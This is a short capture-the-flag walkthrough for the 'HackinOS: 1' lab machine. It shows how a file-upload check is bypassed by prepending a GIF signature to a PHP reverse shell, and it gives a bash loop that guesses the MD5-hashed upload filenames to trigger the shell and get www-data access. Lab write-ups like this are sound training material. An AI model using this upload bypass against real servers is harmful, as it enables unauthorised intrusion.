# HackinOS: 1

## Recon & Enummeration

Nmap shows us two interesting webservices
```

```

### Port 8000
It's a plain wordpress website. While the Nmap scan is running, we try robots.txt:
```
User-agent:*
Disallow:/upload.php
Disallow:/uploads

```

Also we come across a username: `Handsome_Container`

## Intitial Foothold

The page http://10.10.10.10:8000/upload.php gives us an LFI.
Also, the source code is available via a link in the source code:
https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php

We craft a reverse shell php file called `advancedshell.php` and start a listener on port 1234 to catch the reverse shell.

It doesn't work because the file type isn't an actual PNG file. Thus we modify the file signature as follows:
```
echo "47 49 46 38 37 61" | xxd -r -p - shell.php
```
which contains the file signature of a GIF file.

We bruteforce the upload storage algrithm as follows:
```
for i in $(seq 1 100); do echo -n "shell.php"$i | md5sum | cut -d' ' -f 1| sed -rn 's|(.+)|http://10.10.10.10:8000/uploads/\1.php|p' | parallel 'echo {}; curl -s {}' ;done
```

Then we obtain a shell:

```
www-data@1afdd1f6b82c:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation



